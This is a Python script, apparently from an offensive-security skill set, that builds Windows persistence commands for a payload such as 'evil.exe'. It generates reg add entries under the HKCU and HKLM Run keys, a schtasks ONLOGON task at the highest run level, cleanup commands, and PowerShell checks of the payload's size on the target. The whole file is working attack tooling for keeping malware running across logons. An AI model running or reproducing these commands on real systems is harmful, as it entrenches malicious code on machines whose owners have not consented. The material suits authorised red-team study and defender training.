#!/usr/bin/env python3
"""Command builder for host-level persistence: Registry Run Keys and Scheduled Tasks.

Usage:
  python skills/persistence/scripts/host_persist.py --type registry --payload-path C:\\\\Users\\\\Public\\\\evil.exe --task-name EvilTask
  python skills/persistence/scripts/host_persist.py --type schtasks --payload-path C:\\\\Users\\\\Public\\\\evil.exe --task-name EvilTask
"""

from __future__ import annotations

import argparse
import json


REGISTRY_PATHS = [
    r"HKCU\Software\Microsoft\Windows\CurrentVersion\Run",
    r"HKLM\Software\Microsoft\Windows\CurrentVersion\Run",
]


def build_registry(payload_path: str, task_name: str) -> dict[str, object]:
    commands = []
    for hive in REGISTRY_PATHS:
        commands.append(
            [
                "reg",
                "add",
                hive,
                "/v",
                task_name,
                "/t",
                "REG_SZ",
                "/d",
                payload_path,
                "/f",
            ]
        )
    cleanup = [
        ["reg", "delete", REGISTRY_PATHS[0], "/v", task_name, "/f"],
        ["reg", "delete", REGISTRY_PATHS[1], "/v", task_name, "/f"],
    ]
    return {
        "type": "registry",
        "commands": commands,
        "registry_paths": REGISTRY_PATHS,
        "cleanup_commands": cleanup,
        "note": "Run the HKCU variant as a low-priv user; HKLM requires admin.",
    }


def build_schtasks(payload_path: str, task_name: str) -> dict[str, object]:
    create_cmd = [
        "schtasks",
        "/Create",
        "/SC",
        "ONLOGON",
        "/TN",
        task_name,
        "/TR",
        payload_path,
        "/RL",
        "HIGHEST",
        "/F",
    ]
    run_cmd = ["schtasks", "/Run", "/TN", task_name]
    delete_cmd = ["schtasks", "/Delete", "/TN", task_name, "/F"]
    return {
        "type": "schtasks",
        "commands": [create_cmd, run_cmd],
        "cleanup_commands": [delete_cmd],
        "note": "Requires admin for /RL HIGHEST; drop flag for low-priv variant.",
    }


def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(
        description="Host persistence command builder (registry or schtasks)."
    )
    parser.add_argument(
        "--type",
        required=True,
        choices=["registry", "schtasks"],
        help="Persistence mechanism",
    )
    parser.add_argument(
        "--payload-path",
        required=True,
        help="Full path to the payload executable on target",
    )
    parser.add_argument(
        "--task-name", required=True, help="Registry value name or scheduled task name"
    )
    return parser.parse_args()


def main() -> int:
    args = parse_args()
    if args.type == "registry":
        result = build_registry(args.payload_path, args.task_name)
    else:
        result = build_schtasks(args.payload_path, args.task_name)

    result["tool"] = "built-in"
    result["payload_path"] = args.payload_path
    result["task_name"] = args.task_name
    result["payload_readiness"] = {
        "terminal_focus_required": True,
        "size_verification": {
            "required": True,
            "method": "size",
            "remote_commands": [
                f"Get-Item '{args.payload_path}' | Select-Object FullName,Length",
                f"dir '{args.payload_path}'",
                f"powershell -c \"(Get-Item '{args.payload_path}').Length\"",
            ],
            "compare_rule": "Verify the payload file size on the host before creating persistence. Do not continue if the remote size is incomplete.",
        },
    }
    print(json.dumps(result, indent=2, ensure_ascii=False))
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
